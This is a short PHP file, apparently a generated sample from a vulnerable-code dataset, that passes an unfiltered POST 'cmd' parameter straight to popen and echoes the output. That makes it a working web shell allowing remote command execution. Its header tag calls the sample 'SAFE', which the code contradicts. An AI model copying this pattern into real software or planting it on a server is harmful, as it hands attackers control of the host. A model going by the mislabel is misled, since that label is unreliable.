<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_AKE; SKELETON=S0; KEY=cmd; SINK=B6; VAR=v0011 */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$inp = array_key_exists("cmd", $_POST) ? (string)$_POST["cmd"] : "";
$inp = (string)$inp; // no value processing
$out = SINK_B6($inp);
echo (string)($out);
?>
